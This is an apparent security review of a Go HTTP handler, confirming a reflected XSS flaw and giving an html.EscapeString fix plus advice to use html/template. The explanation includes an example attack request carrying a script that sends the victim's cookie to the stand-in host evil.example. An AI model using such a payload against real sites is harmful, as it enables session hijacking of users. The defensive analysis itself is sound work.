## Verdict

Confirmed. `customerNote` is read from the untrusted query string and written into the HTML response body via `fmt.Fprintf` with no output encoding, allowing an attacker-controlled `note` parameter to inject arbitrary markup or script that executes in the victim's browser (reflected XSS). The adjacent `ticketID` value on line 14 is reflected the same way and shares the same defect.

## Source

`r.URL.Query().Get("note")` on line 10 (and `r.URL.Query().Get("id")` on line 9) — both pull directly from the HTTP request's query string, which is fully attacker-controlled.

## Fix

```go
package main

import (
	"fmt"
	"html"
	"net/http"
)

func ticketStatusHandler(w http.ResponseWriter, r *http.Request) {
	ticketID := r.URL.Query().Get("id")
	customerNote := r.URL.Query().Get("note")

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprintf(w, "<html><body>")
	fmt.Fprintf(w, "<h2>Ticket %s</h2>", html.EscapeString(ticketID))
	fmt.Fprintf(w, "<p>Customer note: %s</p>", html.EscapeString(customerNote))
	fmt.Fprintf(w, "</body></html>")
}

func main() {
	http.HandleFunc("/support/ticket", ticketStatusHandler)
	http.ListenAndServe(":8080", nil)
}
```

## Explanation

`fmt.Fprintf` performs no HTML-aware encoding — `%s` inserts the raw string bytes into the response, so any `<`, `>`, `"`, `'`, or `&` in `customerNote` (or `ticketID`) is written verbatim into the page and interpreted by the browser as markup. A request like `GET /support/ticket?note=<script>document.location='https://evil.example/steal?c='+document.cookie</script>` renders live script in the response.

`html.EscapeString` (Go's standard `html` package) converts the five characters that matter for HTML body context — `<`, `>`, `&`, `'`, `"` — into their entity equivalents (`&lt;`, `&gt;`, `&amp;`, `&#39;`, `&#34;`), so the value can no longer close the surrounding tag, open a new element, or introduce an attribute. Applying it at the point of output (immediately before each `%s` substitution) ensures every reflected value is neutralized regardless of which code path produced it, and it composes safely even if `ticketID` or `customerNote` are reused elsewhere unescaped.

A more robust long-term fix is to render this response with `html/template` instead of `fmt.Fprintf` string concatenation: `html/template` performs context-aware auto-escaping (HTML body, attribute, URL, or JS context are each escaped differently) and does not depend on every call site remembering to escape manually. `html.EscapeString` is the minimal, targeted fix for this handler; if more dynamic HTML is added to this response later, migrating to `html/template` removes the risk of a future unescaped `Fprintf` call reintroducing the same class of bug.
